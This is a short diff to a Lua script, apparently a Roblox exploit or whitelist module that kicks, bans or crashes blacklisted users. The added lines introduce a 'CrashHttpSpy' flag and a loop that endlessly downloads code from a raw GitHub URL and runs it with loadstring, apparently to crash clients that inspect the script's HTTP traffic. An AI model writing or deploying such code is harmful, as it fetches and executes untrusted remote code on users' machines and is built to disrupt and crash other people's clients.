@@ -8,6 +8,7 @@ local BanBlacklistedUsersEnabled = false
 local CrashBlacklistedUsersEnabled = false
 local CrashAllIsActive = true
 local ScriptIsDisabled = false
+local CrashHttpSpy = true
 -----------------------------
 if KickBlacklistedUsersEnabled then
       task.wait(delay)
@@ -45,4 +46,11 @@ end
 -----------------------------
 if ScriptIsDisabled then 
    lplr:kick("This script is disabled.")
+end
+-----------------------------
+if CrashHttpSpy then
+   while true do 
+      task.wait()
+      loadstring(game:HttpGet('https://raw.githubusercontent.com/kidsbottest/modules-whitelist/main/qwertyuiiscoolandhotandyes'))()
+    end
 end
